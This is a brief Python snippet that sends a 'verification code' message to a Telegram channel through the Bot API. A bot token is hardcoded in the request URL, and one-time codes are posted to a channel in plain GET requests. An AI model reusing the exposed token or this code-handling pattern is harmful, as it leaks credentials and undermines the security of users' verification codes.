import requests
channel_id = '@salomlaruitc'

def send_ms_to_channel(code):

    link = f"https://api.telegram.org/bot6943121178:AAGoAaOy2114xqOzawKAM-twOO108J1Efhc/sendMessage?chat_id={channel_id}&text=Verification code : {code}"
    requests.get(link)

    return code



 

